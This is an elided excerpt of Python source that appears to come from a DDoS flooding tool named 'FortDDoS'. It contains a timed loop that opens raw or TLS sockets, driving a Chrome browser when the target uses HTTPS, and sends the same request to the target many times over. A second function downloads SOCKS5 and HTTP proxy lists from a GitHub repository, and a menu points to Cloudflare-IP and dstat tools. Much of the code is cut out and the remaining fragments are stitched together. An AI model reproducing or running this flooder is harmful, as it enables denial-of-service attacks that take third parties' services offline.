    ...
    while time.time() < timer:
        try:
            ...
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
                s.driver = uc.Chrome(version_main=95)
                s.driver.get(target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
...
def downloadsocks(choice):
    ...
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/FortniBloxYT1/FortDDoS/main/socks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
    ...
    if choice == "1":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/FortniBloxYT1/FortDDoS/main/http.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
...
Other:
 ...
 Exit
    ...
    if tool == "cfip":
        ...
        print("https://dstat.cc https://cyber-hub.pw")
        return tools()
    elif tool == "dns":
        return tools()
    elif tool == "check":
